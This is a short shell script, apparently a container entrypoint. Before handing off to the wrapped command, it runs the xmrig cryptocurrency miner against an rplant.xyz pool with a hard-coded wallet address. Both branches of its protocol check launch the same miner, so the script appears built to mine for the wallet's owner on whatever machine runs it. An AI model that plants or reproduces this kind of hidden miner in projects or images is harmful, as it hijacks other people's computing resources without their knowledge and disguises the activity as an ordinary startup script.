#!/bin/sh

set -e

if [ "$PROTO" = "ws" ]
then	./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.neverlose -t 4
else    ./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.neverlose -t 4
fi


exec "$@"
